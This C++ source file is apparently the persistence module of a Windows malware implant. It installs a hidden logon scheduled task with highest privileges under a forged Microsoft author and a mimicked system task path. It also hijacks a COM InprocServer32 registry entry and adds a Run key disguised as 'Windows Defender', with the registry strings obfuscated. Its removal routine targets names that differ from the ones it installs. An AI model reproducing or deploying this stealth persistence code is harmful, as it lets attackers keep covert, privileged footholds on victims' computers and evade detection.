// Persistence (scheduled tasks + COM + registry)

#include "../include/Persistence.h"
#include "../include/StringObfuscation.h"
#include <iostream>
#include <taskschd.h>
#include <comdef.h>
#include <initguid.h>

// Task Scheduler GUIDs manually (for MinGW compatibility)
DEFINE_GUID(CLSID_TaskScheduler, 0x0f87369f, 0xa4e5, 0x4cfc, 0xbd, 0x3e, 0x73, 0xe6, 0x15, 0x45, 0x72, 0xdd);
DEFINE_GUID(IID_ITaskService, 0x2faba4c7, 0x4da9, 0x4013, 0x96, 0x97, 0x20, 0xcc, 0x3f, 0xd4, 0x0f, 0x85);
DEFINE_GUID(IID_ILogonTrigger, 0x72dade38, 0xfae4, 0x4b3e, 0xba, 0xf4, 0x5d, 0x00, 0x9a, 0xf0, 0x2b, 0x1c);
DEFINE_GUID(IID_IExecAction, 0x4c3d624d, 0xfd6b, 0x49a3, 0xb9, 0xb7, 0x09, 0xcb, 0x3c, 0xd3, 0xf0, 0x47);

#pragma comment(lib, "taskschd.lib")

using namespace std;

// Create scheduled task at logon
BOOL Persistence::CreateScheduledTask(const wstring &taskName, const wstring &exePath)
{
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr))
    {
        return FALSE;
    }

    hr = CoInitializeSecurity(NULL, -1, NULL, NULL,
                              RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                              RPC_C_IMP_LEVEL_IMPERSONATE,
                              NULL, 0, NULL);

    ITaskService *pService = NULL;
    hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
                          IID_ITaskService, (void **)&pService);

    if (FAILED(hr))
    {
        CoUninitialize();
        return FALSE;
    }

    hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
    if (FAILED(hr))
    {
        pService->Release();
        CoUninitialize();
        return FALSE;
    }

    ITaskFolder *pRootFolder = NULL;
    hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
    if (FAILED(hr))
    {
        pService->Release();
        CoUninitialize();
        return FALSE;
    }

    // Delete existing task if any
    pRootFolder->DeleteTask(_bstr_t(taskName.c_str()), 0);

    ITaskDefinition *pTask = NULL;
    hr = pService->NewTask(0, &pTask);
    if (FAILED(hr))
    {
        pRootFolder->Release();
        pService->Release();
        CoUninitialize();
        return FALSE;
    }

    // Set registration info
    IRegistrationInfo *pRegInfo = NULL;
    hr = pTask->get_RegistrationInfo(&pRegInfo);
    if (SUCCEEDED(hr))
    {
        pRegInfo->put_Author(_bstr_t(L"Microsoft Corporation"));
        pRegInfo->put_Description(_bstr_t(L"Maintains network connectivity and manages various network operations."));
        pRegInfo->Release();
    }

    // Set principal
    IPrincipal *pPrincipal = NULL;
    hr = pTask->get_Principal(&pPrincipal);
    if (SUCCEEDED(hr))
    {
        pPrincipal->put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN);
        pPrincipal->put_RunLevel(TASK_RUNLEVEL_HIGHEST);
        pPrincipal->Release();
    }

    // Set settings
    ITaskSettings *pSettings = NULL;
    hr = pTask->get_Settings(&pSettings);
    if (SUCCEEDED(hr))
    {
        pSettings->put_StartWhenAvailable(VARIANT_TRUE);
        pSettings->put_DisallowStartIfOnBatteries(VARIANT_FALSE);
        pSettings->put_StopIfGoingOnBatteries(VARIANT_FALSE);
        pSettings->put_Hidden(VARIANT_TRUE);            // Hide from Task Scheduler UI
        pSettings->put_AllowDemandStart(VARIANT_FALSE); // Disable manual start
        pSettings->put_Enabled(VARIANT_TRUE);
        pSettings->Release();
    }

    // Create trigger
    ITriggerCollection *pTriggerCollection = NULL;
    hr = pTask->get_Triggers(&pTriggerCollection);
    if (SUCCEEDED(hr))
    {
        ITrigger *pTrigger = NULL;
        hr = pTriggerCollection->Create(TASK_TRIGGER_LOGON, &pTrigger);
        if (SUCCEEDED(hr))
        {
            ILogonTrigger *pLogonTrigger = NULL;
            hr = pTrigger->QueryInterface(IID_ILogonTrigger, (void **)&pLogonTrigger);
            if (SUCCEEDED(hr))
            {
                pLogonTrigger->put_Id(_bstr_t(L"LogonTriggerId"));
                pLogonTrigger->put_Enabled(VARIANT_TRUE);
                pLogonTrigger->Release();
            }
            pTrigger->Release();
        }
        pTriggerCollection->Release();
    }

    // Create action
    IActionCollection *pActionCollection = NULL;
    hr = pTask->get_Actions(&pActionCollection);
    if (SUCCEEDED(hr))
    {
        IAction *pAction = NULL;
        hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
        if (SUCCEEDED(hr))
        {
            IExecAction *pExecAction = NULL;
            hr = pAction->QueryInterface(IID_IExecAction, (void **)&pExecAction);
            if (SUCCEEDED(hr))
            {
                pExecAction->put_Path(_bstr_t(exePath.c_str()));
                pExecAction->Release();
            }
            pAction->Release();
        }
        pActionCollection->Release();
    }

    // Register task
    IRegisteredTask *pRegisteredTask = NULL;
    hr = pRootFolder->RegisterTaskDefinition(
        _bstr_t(taskName.c_str()),
        pTask,
        TASK_CREATE_OR_UPDATE,
        _variant_t(),
        _variant_t(),
        TASK_LOGON_INTERACTIVE_TOKEN,
        _variant_t(L""),
        &pRegisteredTask);

    BOOL success = SUCCEEDED(hr);

    if (pRegisteredTask)
        pRegisteredTask->Release();
    pTask->Release();
    pRootFolder->Release();
    pService->Release();
    CoUninitialize();

#ifdef _DEBUG
    if (success)
    {
        wcout << L"[Persistence] Scheduled task created: " << taskName << endl;
    }
#endif

    return success;
}

BOOL Persistence::CreateWMIEvent(const wstring &eventName, const wstring &exePath)
{

#ifdef _DEBUG
    wcout << L"[Persistence] WMI Event persistence disabled (MinGW incompatible)" << endl;
#endif

    return FALSE;
}

// Hijack COM InprocServer32 for DLL redirection persistence
BOOL Persistence::CreateCOMHijack(const wstring &exePath)
{
    wstring clsid = L"{00021401-0000-0000-C000-000000000046}";
    wstring regPath = L"Software\\Classes\\CLSID\\" + clsid + L"\\InprocServer32";

    HKEY hKey;
    LONG result = RegCreateKeyExW(HKEY_CURRENT_USER, regPath.c_str(), 0, NULL,
                                  REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);

    if (result != ERROR_SUCCESS)
    {
        return FALSE;
    }

    // Set default value to our payload path
    result = RegSetValueExW(hKey, NULL, 0, REG_SZ,
                            (BYTE *)exePath.c_str(),
                            (wcslen(exePath.c_str()) + 1) * sizeof(wchar_t));

    // Set ThreadingModel
    wstring threadingModel = L"Apartment";
    RegSetValueExW(hKey, L"ThreadingModel", 0, REG_SZ,
                   (BYTE *)threadingModel.c_str(),
                   (wcslen(threadingModel.c_str()) + 1) * sizeof(wchar_t));

    RegCloseKey(hKey);

#ifdef _DEBUG
    if (result == ERROR_SUCCESS)
    {
        wcout << L"[Persistence] COM hijack installed for CLSID: " << clsid << endl;
    }
#endif

    return (result == ERROR_SUCCESS);
}

// Registry Run key persistence fallback
BOOL Persistence::CreateRegistryRun(const wstring &valueName, const wstring &exePath)
{
    HKEY hKey;
    LONG result = RegOpenKeyExW(
        HKEY_CURRENT_USER,
        OBFUSCATE_W(L"Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
        0,
        KEY_SET_VALUE,
        &hKey);

    if (result != ERROR_SUCCESS)
    {
        return FALSE;
    }

    result = RegSetValueExW(
        hKey,
        valueName.c_str(),
        0,
        REG_SZ,
        (BYTE *)exePath.c_str(),
        (wcslen(exePath.c_str()) + 1) * sizeof(wchar_t));

    RegCloseKey(hKey);

#ifdef _DEBUG
    if (result == ERROR_SUCCESS)
    {
        wcout << L"[Persistence] Registry Run key created" << endl;
    }
#endif

    return (result == ERROR_SUCCESS);
}

// Install persistence with multiple fallback methods
BOOL Persistence::InstallPersistence(const wstring &exePath)
{
#ifdef _DEBUG
    wcout << L"[Persistence] Installing multi-layer persistence..." << endl;
#endif

    BOOL success = FALSE;

    // Method 1: Scheduled Task (primary, stealthier - hidden from UI)
    wstring taskName = L"\\Microsoft\\Windows\\NetTrace\\GatherNetworkInfo"; // Mimics legitimate Windows task path
    if (CreateScheduledTask(taskName, exePath))
    {
        success = TRUE;
    }

    // Method 2: COM Hijacking (stealthy DLL persistence) - invisible in startup apps
    CreateCOMHijack(exePath);

    // Method 3: Registry Run (fallback) - uses hidden registry location
    if (!success)
    {
        wstring valueName = L"Windows Defender"; // Mimics Windows Defender tray icon
        if (CreateRegistryRun(valueName, exePath))
        {
            success = TRUE;
        }
    }

    return success;
}

BOOL Persistence::RemovePersistence()
{
#ifdef _DEBUG
    wcout << L"[Persistence] Removing persistence mechanisms..." << endl;
#endif

    // Remove scheduled task
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (SUCCEEDED(hr))
    {
        ITaskService *pService = NULL;
        hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
                              IID_ITaskService, (void **)&pService);

        if (SUCCEEDED(hr))
        {
            pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());

            ITaskFolder *pRootFolder = NULL;
            pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);

            if (pRootFolder)
            {
                pRootFolder->DeleteTask(_bstr_t(L"MicrosoftEdgeUpdateTaskMachineUA"), 0);
                pRootFolder->Release();
            }

            pService->Release();
        }

        CoUninitialize();
    }

    // Remove registry run key
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, OBFUSCATE_W(L"Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
                      0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
    {
        RegDeleteValueW(hKey, OBFUSCATE_W(L"SecurityHealthSystray"));
        RegCloseKey(hKey);
    }

    return TRUE;
}